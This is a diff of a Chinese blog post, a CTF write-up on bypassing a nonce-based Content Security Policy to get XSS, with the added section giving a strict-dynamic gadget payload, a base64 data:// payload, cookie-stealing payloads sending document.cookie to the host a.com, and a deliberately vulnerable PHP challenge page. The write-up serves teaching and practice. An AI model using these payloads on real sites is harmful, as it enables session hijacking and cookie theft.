@@ -6,13 +6,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+    <meta name="description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析这里由于是本地写的类似程序，目标为弹框显示“1”即可。 访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在">
 <meta name="keywords" content="XSS,Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一道绕过CSP的XSS题目">
 <meta property="og:url" content="https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/index.html">
 <meta property="og:site_name" content="Mi1k7ea">
-<meta property="og:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+<meta property="og:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析这里由于是本地写的类似程序，目标为弹框显示“1”即可。 访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/1.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/2.png">
@@ -21,16 +21,21 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/5.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/6.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/14.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/8.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/9.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/10.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/11.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/12.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/13.png">
-<meta property="og:updated_time" content="2019-02-22T14:46:54.871Z">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/15.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/16.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/17.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/18.png">
+<meta property="og:updated_time" content="2019-02-23T15:06:41.128Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一道绕过CSP的XSS题目">
-<meta name="twitter:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+<meta name="twitter:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析这里由于是本地写的类似程序，目标为弹框显示“1”即可。 访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在">
 <meta name="twitter:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/1.png">
     
     
@@ -73,17 +78,17 @@
     <span id="nav">
       <ul>
          
-          <li><a href="/">寒舍</a></li>
+          <li><a href="/">門面</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">歸檔</a></li>
          
-          <li><a href="/categories/">目录</a></li>
+          <li><a href="/categories/">目錄</a></li>
          
-          <li><a href="/tags/">标签</a></li>
+          <li><a href="/tags/">標籤</a></li>
          
-          <li><a href="/about/">吾者</a></li>
+          <li><a href="/about/">吾</a></li>
          
-          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
          
           <li><a href="/atom.xml">RSS</a></li>
         
@@ -101,7 +106,7 @@
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-top" class="info" style="display:none;">返回頂部</span>
       <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br>
@@ -175,7 +180,8 @@
 
   <div class="content" itemprop="articleBody">
     <p>之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>访问目标站点，如下图所示，看到提示输入URL：</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这里由于是本地写的类似程序，目标为弹框显示“1”即可。</p>
+<p>访问目标站点，如下图所示，看到提示输入URL：</p>
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/1.png" alt=""></p>
 <p>啥也不输入，点击Go，发现URL栏多了name参数和url参数：</p>
 <p> <img src="/2019/02/21/一道绕过CSP的XSS题目/2.png" alt=""></p>
@@ -196,6 +202,8 @@
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/6.png" alt=""></p>
 <p>那就输入一个外部URL地址如<a href="http://www.mi1k7ea.com" target="_blank" rel="noopener">本博客</a>，发现提示只能输入服务端本身的URL，即应该限定了只能输入访问本地的URL，并且限制了只能是协议://ip:port这种形式才能正常执行：</p>
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/7.png" alt=""></p>
+<p>本地有个test.txt文件可以访问，输入该文件地址，可以查看到页面将文件内容直接输出到pre标签中，这里可以推测，后台应该是调用file_get_content()来获取目标URL内容的：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/14.png" alt=""></p>
 <p>那么问题来了，限制了只能通过协议://ip:port这种形式来作为开头输入，并且限定只能是服务端的IP，那不就没法注入XSS payload了？</p>
 <p>当时卡在这里卡了很久，后面发现，这是PHP的题目，是不是可以利用PHP伪协议？要想输入的内容能显现在页面中，能与之相关联的伪协议即data://伪协议。</p>
 <p>测试一下，在输入框输入：</p>
@@ -211,7 +219,7 @@
 <p>这里关注前面的script-src ‘nonce-xx’，我们想一下，是不是可以劫持某个script标签的nonce属性呢？</p>
 <p>在参考的文章中说到：</p>
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/10.png" alt=""></p>
-<p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码。</p>
+<p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p>
 <p>我们回过头来看看页面代码布局，可以看到在插入的标签后面在一段拥有nonce属性的script标签，就是它了：</p>
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/11.png" alt=""></p>
 <p>构造payload：我们需要先闭合掉前面的pre和form标签，然后再插入script标签；在script标签中，先写入包含远程恶意js代码文件的src属性，再添加a=”。即</p>
@@ -222,8 +230,28 @@
 <p>再看一下页面元素：</p>
 <p><img src="/2019/02/21/一道绕过CSP的XSS题目/13.png" alt=""></p>
 <p>这里再解释一遍，把pre和form标签闭合之后，输入<code>&lt;script src=xxx a=&quot;</code>的内容，由于浏览器的补全功能，a标签的双引号会和最后的script标签的第一个元素即type的双引号闭合掉，从而使中间的内容即第一个红框内的内容无效，导致后面的内容自己成为新的属性，包括nonce属性，从而成功劫持了最后的script标签的nonce属性为插入的script属性，最终成功执行。</p>
-<p>但是上述的a标签在Chrome上是执行不了的，原因在于Chrome中a属性中的<code>&lt;script</code>会被认为是一个标签而不是字符，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>
-<h3 id="利用strict-dynamic结合gadget绕过"><a href="#利用strict-dynamic结合gadget绕过" class="headerlink" title="利用strict-dynamic结合gadget绕过"></a>利用strict-dynamic结合gadget绕过</h3><h2 id="模仿写的源码"><a href="#模仿写的源码" class="headerlink" title="模仿写的源码"></a>模仿写的源码</h2>
+<p>但是上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>
+<h3 id="利用strict-dynamic结合gadget绕过"><a href="#利用strict-dynamic结合gadget绕过" class="headerlink" title="利用strict-dynamic结合gadget绕过"></a>利用strict-dynamic结合gadget绕过</h3><p>这里探讨第二种方法。</p>
+<p>前面知道，CSP设置了strict-dynamic，结合查阅的Black Hat 2017的文章可知，我们可以在页面上找一个可以动态生成DOM节点的JS Gadget，然后通过某些方式来劫持其中的DOM节点元素，从而使动态生成的标签可以继承该Gadget的nonce直接执行JS代码。</p>
+<p>我们再分析一遍源码：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/15.png" alt=""></p>
+<p>由之前的分析知道，最后的script标签中是处理URL和创建节点，然后再被head处的JS动态插入到DOM节点中。DOM元素id即为全局变量。我们注意到最后的script标签的JS代码中定义了一个全局变量i，而i在head处的JS代码中被动态添加到id为forminput的标签中（即绿框框中的div标签），并且当i.name不为空时，将i.name的值设置到id为yourname的标签中（即绿框框中的a标签）。这里看到，div标签在a标签前面，也就是说，我们可以通过闭合使最后的JS代码失效，从而可以劫持i，再通过i来创建新标签来劫持yourname；最后看到蓝框，params[“name”]可以通过创建一个新的标签，其分别有两个属性，id属性值为params，name属性值为要执行的JS代码，接着将id为yourname的标签设置为script标签即可（因为蓝框中的代码就是将id为params的标签的name属性值放入id为yourname的标签中，进而实现将恶意Js代码放入script标签中）。由strict-dynamic知，head的JS代码动态创建的JS是受信任的，因此该动态创建的script标签可以执行恶意JS代码。</p>
+<p>构造payload：先闭合掉pre和form标签，至于最后面的script可以通过在最后输入<code>&lt;script&gt;</code>来使其失效；id为yourname的标签为script标签，但该标签没有name属性、需要多输入一个包含name属性且id为params的标签；因此，劫持i的标签需可以内嵌多个标签。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"i"</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"yourname"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"params"</span> <span class="attr">name</span>=<span class="string">"alert(1)"</span> /&gt;</span>&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+<p>当然div标签可以换成span、form等，textarea标签可换成input、textarea、button、iframe、object等标签，效果一样。</p>
+<p>Base64编码后添加到data://伪协议后面构造最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/plain;base64,PC9wcmU+PC9mb3JtPjxkaXYgaWQ9ImkiPjxzY3JpcHQgaWQ9InlvdXJuYW1lIj48L3NjcmlwdD48YSBpZD0icGFyYW1zIiBuYW1lPSJhbGVydCgxKSIgLz4+PC9kaXY+PHNjcmlwdD4=</span><br></pre></td></tr></table></figure>
+<p>直接输入运行，弹框了：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/16.png" alt=""></p>
+<p>查看元素，看到箭头处输入的script标签将后面的JS代码闭合失效了，而在红框id为forminput的div标签内，动态创建了id为i的div标签，该标签内含有一个id为yourname的script标签和id为params、name为恶意JS代码的a标签：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/17.png" alt=""></p>
+<p>至此，我们成功利用strict-dynamic结合gadget来绕过CSP实现XSS弹框了。</p>
+<p>能够弹框，就肯定能够执行其他XSS payload了，如返回cookie的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.open(&apos;//a.com/?&apos;+escape(document.cookie))&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;</span><br><span class="line">或</span><br><span class="line">&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.location.href=&apos;http://a.com/?cookie=&apos;+document.cookie&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/18.png" alt=""></p>
+<h2 id="模仿写的源码"><a href="#模仿写的源码" class="headerlink" title="模仿写的源码"></a>模仿写的源码</h2><p>以下为模仿写的代码，仅供参考练习。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$this_host = $_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">setcookie(<span class="string">'flag'</span>, <span class="string">'xxctf&#123;Mi1k7ea&#125;'</span>);</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(<span class="number">16</span>));</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'strict-dynamic'; base-uri 'self'; style-src 'self'; font-src 'self'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">	&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/static/jquery-3.3.1.js"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script type=<span class="string">"text/javascript"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;</span><br><span class="line">		$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">			$(<span class="string">"#forminput"</span>).append(i);</span><br><span class="line">			<span class="keyword">if</span> (location.search.indexOf(<span class="string">"name="</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">				$(<span class="string">"#yourname"</span>).text(params[<span class="string">"name"</span>])</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;)</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"csp.php"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">	&lt;div id=<span class="string">"forminput"</span>&gt;</span><br><span class="line">		&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> value=<span class="string">"Mi1k7ea"</span> hidden=<span class="string">"true"</span>&gt;</span><br><span class="line">		&lt;button type=<span class="string">"submit"</span>&gt;Go&lt;/button&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;h3&gt;Hi, &lt;a id=<span class="string">"yourname"</span>&gt;&lt;/a&gt; :)&lt;/h3&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">			$x = @$_GET[<span class="string">'url'</span>];</span><br><span class="line">			<span class="keyword">if</span> (filter_var($x, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">				$r = parse_url($x);</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">isset</span>($r[<span class="string">'port'</span>])) &#123;</span><br><span class="line">					$r[<span class="string">'host'</span>] = $r[<span class="string">'host'</span>].<span class="string">":"</span>.$r[<span class="string">'port'</span>];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (preg_match(<span class="string">"/&#123;$this_host&#125;$/i"</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">					$a = file_get_contents($x);</span><br><span class="line">					<span class="keyword">echo</span> (<span class="string">"Result: &lt;pre&gt;"</span>.$a.<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;script nonce=&#123;$nonce&#125;&gt;alert('You can only input &#123;$this_host&#125;')&lt;/script&gt;"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Invaild URL!"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;</span><br><span class="line">	url_param = <span class="keyword">new</span> URL(location.href).searchParams</span><br><span class="line">	params = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span>(value of url_param.keys())&#123;</span><br><span class="line">		params[value] = url_param.get(value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> i = document.createElement(<span class="string">"input"</span>);</span><br><span class="line">	i.name = <span class="string">"url"</span>;</span><br><span class="line">	i.type = <span class="string">"text"</span>;</span><br><span class="line">	<span class="keyword">if</span> (location.search.indexOf(<span class="string">"post="</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">		i.value = params[<span class="string">"post"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		i.placeholder = <span class="string">"input url..."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
   </div>
 </article>
 
@@ -250,17 +278,17 @@
     <div id="nav-footer" style="display: none">
       <ul>
          
-          <li><a href="/">寒舍</a></li>
+          <li><a href="/">門面</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">歸檔</a></li>
          
-          <li><a href="/categories/">目录</a></li>
+          <li><a href="/categories/">目錄</a></li>
          
-          <li><a href="/tags/">标签</a></li>
+          <li><a href="/tags/">標籤</a></li>
          
-          <li><a href="/about/">吾者</a></li>
+          <li><a href="/about/">吾</a></li>
          
-          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
          
           <li><a href="/atom.xml">RSS</a></li>
         
@@ -288,10 +316,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目錄</a>
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回頂部</a>
     </div>
 
   </div>
@@ -310,17 +338,17 @@
     <nav>
       <ul>
          
-          <li><a href="/">寒舍</a></li>
+          <li><a href="/">門面</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">歸檔</a></li>
          
-          <li><a href="/categories/">目录</a></li>
+          <li><a href="/categories/">目錄</a></li>
          
-          <li><a href="/tags/">标签</a></li>
+          <li><a href="/tags/">標籤</a></li>
          
-          <li><a href="/about/">吾者</a></li>
+          <li><a href="/about/">吾</a></li>
          
-          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
          
           <li><a href="/atom.xml">RSS</a></li>
         
